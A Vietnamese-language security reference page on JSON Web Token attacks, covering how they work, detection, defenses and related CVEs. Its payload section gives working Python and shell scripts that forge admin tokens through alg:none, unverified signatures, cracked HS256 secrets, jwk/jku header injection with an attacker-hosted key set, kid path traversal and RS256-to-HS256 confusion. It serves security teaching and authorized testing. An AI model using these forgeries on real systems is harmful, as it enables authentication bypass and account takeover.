# JWT Attacks

> Các lỗ hổng trong việc ký/xác minh JWT cho phép kẻ tấn công giả mạo hoặc can thiệp vào token. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/jwt.md`](../../../../Troubleshooting_Guide/jwt.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** JSON Web Token · A07:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Tấn công JWT khai thác các lỗ hổng trong cách máy chủ ký hoặc xác minh JSON Web Token, cho phép kẻ tấn công
giả mạo hoặc can thiệp vào các claim của token. Vì JWT mang theo dữ liệu danh tính và phân quyền
(`sub`, `role`, `admin`) và máy chủ tin tưởng chúng, một lỗ hổng xác minh trở thành chiếm tài khoản
hoặc leo thang đặc quyền.

## Cơ chế hoạt động (How it works)
Một JWT là `header.payload.signature` ở dạng Base64URL; chữ ký nhằm gắn header và
payload với một secret hoặc khóa mà chỉ máy chủ nắm giữ. Kẻ tấn công kiểm soát toàn bộ token, nên bất kỳ
khoảng trống nào trong việc xác minh đều khai thác được: một máy chủ giải mã nhưng không bao giờ kiểm tra chữ ký, chấp nhận
`"alg":"none"`, dùng một secret HS256 dễ đoán, hoặc tin tưởng vật liệu khóa do kẻ tấn công cung cấp trong các
header `jwk`/`jku`/`kid`. Lỗi nhầm lẫn thuật toán kinh điển coi một khóa RSA *công khai* được công bố
như một secret HMAC, nên kẻ tấn công ký lại bằng HS256 dùng khóa công khai đó.

## Tác động (Impact)
Vượt qua xác thực và leo thang đặc quyền — thường là chiếm hoàn toàn tài khoản, bao gồm cả
các tài khoản quản trị, bằng cách giả mạo một token với các claim được nâng cấp. Mức độ nghiêm trọng là cao đến nghiêm trọng,
vì token là bằng chứng danh tính cho cả phiên và thường cho mọi API được bảo vệ.

## Cách phát hiện (How to detect)
- Can thiệp payload (ví dụ thay đổi `sub`) và gắn lại chữ ký cũ vẫn
  xác thực thành công — chữ ký không được xác minh.
- Một token với `"alg":"none"` và không có chữ ký được chấp nhận.
- Các trường header như `jku`, `jwk`, `x5u`, hoặc `kid` có mặt và ảnh hưởng tới việc xác minh
  (ví dụ `kid` trông giống một đường dẫn tệp, `jku` trỏ tới một URL được fetch).
- Một bộ khóa được công bố tại `/jwks.json` hoặc `/.well-known/jwks.json`, kết hợp với một danh sách thuật toán cho phép
  lỏng lẻo, gợi ý về nhầm lẫn RS256→HS256.
- Các secret HS256 ngắn hoặc mặc định bị crack nhanh chóng offline với hashcat mode 16500.

## Khai thác (tóm tắt) (Exploitation)
Giải mã token, xác định điểm yếu từ header, rồi giả mạo. Khi không có xác minh, sửa
các claim và giữ chữ ký gốc; với `alg:none`, bỏ chữ ký. Crack một secret HS256 yếu và ký lại,
hoặc lạm dụng `jwk`/`jku`/`kid` để khiến máy chủ xác minh dựa trên vật liệu khóa của kẻ tấn công.
Đối với nhầm lẫn thuật toán, ký HS256 bằng khóa RSA công khai. Payload và script đầy đủ
nằm ở mục Payload phía dưới.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

Một JWT là ba đoạn Base64URL — `header.payload.signature`. Giải mã từng đoạn trước khi can thiệp:

```bash
echo "HEADER_B64" | base64 -d
echo "PAYLOAD_B64" | base64 -d
```

### Lựa chọn kỹ thuật theo header / điểm yếu (Technique selection by header / weakness)

| Tình huống | Kỹ thuật |
|-----------|-----------|
| Chữ ký không bao giờ được xác minh | Sửa `sub`, dùng lại chữ ký gốc |
| `alg: none` được chấp nhận | Bỏ hoàn toàn chữ ký |
| Secret HS256 yếu | Crack offline, ký lại |
| Header `jwk` được tin tưởng | Nhúng khóa công khai của kẻ tấn công |
| Header `jku` được tin tưởng | Host JWK Set của kẻ tấn công (SSRF) |
| `kid` dùng như đường dẫn tệp | Trỏ tới tệp có nội dung đã biết, ký bằng nó |
| Khóa RSA công khai bị lộ, danh sách thuật toán cho phép lỏng lẻo | Nhầm lẫn RS256 → HS256 |
| Không có khóa công khai | Suy ra từ hai token (sig2n) |

Các tham số header đáng dò: `alg` (none / nhầm lẫn), `kid` (path traversal, SQLi), `jku` (SSRF), `jwk` (khóa nhúng), `x5u`/`x5c` (URL X.509 / chứng chỉ nhúng).

### Chữ ký không được xác minh (Unverified signature)
Máy chủ giải mã nhưng không bao giờ xác minh. Thay đổi claim `sub` và gắn lại chữ ký gốc.

```python
import base64, json

token = "HEADER.PAYLOAD.SIGNATURE"
h, payload_b64, s = token.split(".")

payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
payload["sub"] = "administrator"

new_payload = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(',', ':')).encode()
).rstrip(b'=').decode()

print(f"{h}.{new_payload}.{s}")
```

### Thuật toán "none" (Algorithm "none")
Máy chủ chấp nhận `"alg": "none"` và bỏ qua xác minh. Dấu chấm ở cuối là bắt buộc.

```python
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "administrator", "exp": 9999999999}
forged = f"{b64url(json.dumps(header, separators=(',',':')))}.{b64url(json.dumps(payload, separators=(',',':')))}."
print(forged)
```

### Secret HS256 yếu (Weak HS256 secret)
Crack secret đối xứng offline, rồi giả mạo bất kỳ payload nào với nó.

```bash
hashcat -a 0 -m 16500 "JWT_TOKEN" jwt.secrets.list       # mode 16500 = JWT/HS256
hashcat -m 16500 jwt.txt wordlist.txt --show              # show cracked result
python3 jwt_tool.py <JWT> -C -d jwt.secrets.list
```

```python
import hmac, hashlib, base64

token = open('JWT-3.txt').read().strip()
header, payload, sig_b64 = token.split('.')
message = f"{header}.{payload}".encode()

with open('jwt.secrets.list') as f:
    for line in f:
        secret = line.strip()
        if hmac.new(secret.encode(), message, hashlib.sha256).digest() == base64.urlsafe_b64decode(sig_b64 + '=='):
            print(f"Found: {secret}")
            break
```

```python
import jwt
print(jwt.encode({"sub": "administrator", "exp": 9999999999}, "secret1", algorithm="HS256"))
```

### Tiêm header JWK (JWK header injection)
Nhúng một khóa công khai do kẻ tấn công tạo vào header `jwk`; một máy chủ cấu hình sai sẽ xác minh dựa trên nó.

```python
from cryptography.hazmat.primitives.asymmetric import rsa
import base64, json

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = private_key.public_key().numbers()

def int_b64(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l, 'big')).rstrip(b'=').decode()

attacker_jwk = {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "attacker-key",
                "n": int_b64(pub.n), "e": int_b64(pub.e)}
header = {"alg": "RS256", "typ": "JWT", "kid": "attacker-key", "jwk": attacker_jwk}
payload = {"sub": "administrator", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = private_key.sign(f"{h}.{p}".encode(), None, None)
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

### Tiêm header JKU (JKU header injection)
Máy chủ fetch khóa xác minh từ URL `jku`. Host bộ JWK Set của riêng bạn (một dạng lạm dụng tin cậy kiểu SSRF).

```python
# Step 1 — generate key pair and write the JWK Set
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_nums = pk.public_key().public_numbers()

def ib64(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l, 'big')).rstrip(b'=').decode()

jwks = {"keys": [{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":ib64(pub_nums.n),"e":ib64(pub_nums.e)}]}
with open("attacker-jwks.json","w") as f: json.dump(jwks, f)
pem = pk.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())
with open("attacker.pem","wb") as f: f.write(pem)
```

```python
# Step 2 — forge a token pointing at the hosted set
import jwt
from cryptography.hazmat.primitives import serialization
with open("attacker.pem","rb") as f:
    pk = serialization.load_pem_private_key(f.read(), None)
header = {"alg": "RS256", "typ": "JWT", "kid": "attacker", "jku": "https://YOUR-SERVER/attacker-jwks.json"}
print(jwt.encode({"sub": "administrator", "exp": 9999999999}, pk, algorithm="RS256", headers=header))
```

Phục vụ nó bằng `python3 -m http.server 8080`.

### Path traversal qua KID (KID path traversal)
Khi `kid` được dùng như một đường dẫn tệp, trỏ nó tới một tệp có nội dung đã biết/dự đoán được và ký bằng giá trị đó.

```python
import hmac, hashlib, base64, json

NULL_KEY = b'\x00'
header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
payload = {"sub": "administrator", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = hmac.new(NULL_KEY, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

Các mục tiêu có nội dung dự đoán được: `/dev/null` (`\x00`), `/proc/sys/kernel/randomize_va_space` (`"2\n"`), `/etc/hostname` (tên host của máy chủ).

### Nhầm lẫn thuật toán (RS256 → HS256) (Algorithm confusion)
Nếu máy chủ xác thực thuật toán từ header, đổi RS256 sang HS256 và dùng khóa RSA *công khai* làm secret HMAC.

```python
import requests, base64, json, hmac, hashlib
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

TARGET = "https://TARGET.web-security-academy.net"
jwk = requests.get(f"{TARGET}/jwks.json").json()['keys'][0]

def b64d(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)), 'big')

pub_key = RSAPublicNumbers(b64d(jwk['e']), b64d(jwk['n'])).public_key(None)
pem = pub_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "administrator", "exp": 9999999999}
h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

Khi không có khóa công khai nào được công bố, suy ra nó từ hai token hợp lệ:

```bash
JWT1="eyJ...SIG1"; JWT2="eyJ...SIG2"
docker run --rm -it portswigger/sig2n "$JWT1" "$JWT2"
# test each candidate PEM as the HS256 secret
```

### Các mẫu mã dễ bị tấn công & endpoint khóa quan trọng (Vulnerable code patterns & key endpoints)
Các sink cần nhận biết khi rà soát:

```python
jwt.decode(token, options={"verify_signature": False})        # alg:none / no verify
jwt.decode(token, secret, algorithms=["HS256", "RS256"])      # attacker picks alg
jwt.decode(token, public_key_pem, algorithms=[alg])           # public key as HMAC secret
key = open(f"/keys/{kid}", 'rb').read()                        # kid as file path
jwt.decode(token, secret)                                      # no exp/alg pinning
```

Các endpoint công bố khóa cần dò:

```text
/jwks.json
/.well-known/jwks.json
/.well-known/openid-configuration
/auth/keys
/api/keys
```

## Phòng chống (Defenses)
1. **Luôn xác minh chữ ký** ở phía server và từ chối bất kỳ token không có chữ ký nào — không bao giờ chấp nhận
   `"alg":"none"`.
2. **Ghim thuật toán** một cách tường minh vào thuật toán bạn mong đợi (ví dụ chỉ RS256); không bao giờ để
   header của token chọn, điều này triệt tiêu nhầm lẫn thuật toán.
3. **Khóa mạnh** — dùng các secret HS256 dài, ngẫu nhiên (hoặc khóa bất đối xứng) chống lại việc crack offline;
   xoay vòng chúng.
4. **Không tin tưởng vật liệu khóa do header cung cấp** — bỏ qua hoặc allow-list nghiêm ngặt `jwk`, `jku`,
   `kid`, `x5u`, `x5c`; chỉ phân giải khóa từ một nguồn đáng tin cậy phía server.
5. **Kiểm tra các claim** — thực thi `exp`, `iss`, và `aud`, và giữ vòng đời token ngắn với
   thu hồi phía server khi cần.
6. **Dùng một thư viện JWT được bảo trì** với các mặc định an toàn thay vì tự viết phần xác minh.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=JWT+Attacks
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=JWT+Attacks
- **Exploit-DB** — https://www.exploit-db.com/search?q=JWT+Attacks
- **GitHub Advisories** — https://github.com/advisories?query=JWT+Attacks
- **OSV** — https://osv.dev/list?q=JWT+Attacks
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `JWT Attacks <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi dựa vào chi tiết._
- `CVE-2015-9235` — vượt qua xác minh do nhầm lẫn thuật toán (RS256→HS256) trong node-jsonwebtoken.
- `CVE-2022-23529` — xử lý khóa không an toàn trong node-jsonwebtoken dẫn tới các lỗ hổng xác minh.
- `CVE-2020-28042` — vượt qua xác minh chữ ký JWT trong ServiceStack.

## Tham khảo (References)
- PortSwigger Web Security Academy — JWT attacks.
- OWASP — JSON Web Token for Java / JWT Security Cheat Sheet.
- RFC 7519 — JSON Web Token (JWT); RFC 8725 — JWT Best Current Practices.
